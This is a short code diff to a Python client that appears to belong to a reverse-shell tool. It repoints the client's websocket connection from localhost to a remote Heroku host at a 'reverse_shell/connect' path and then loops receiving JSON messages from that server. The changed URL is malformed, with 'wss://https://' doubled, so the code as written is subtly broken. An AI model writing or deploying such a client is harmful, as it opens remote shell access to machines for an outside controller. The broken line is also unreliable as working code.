@@ -49,8 +49,9 @@ class Client(object):
         while True:
             try:
                 self.connect_to_web_server()
-                ws = websocket.create_connection("ws://localhost:8000/ws/reverse_shell/connect/",
-                                                 cookie=f'sessionid={self.session_id}')
+                ws = websocket.create_connection(
+                    "wss://https://intense-river-70224.herokuapp.com/ws/reverse_shell/connect/",
+                    cookie=f'sessionid={self.session_id}')
                 while True:
                     data = ws.recv()
                     json_data = json.loads(data)
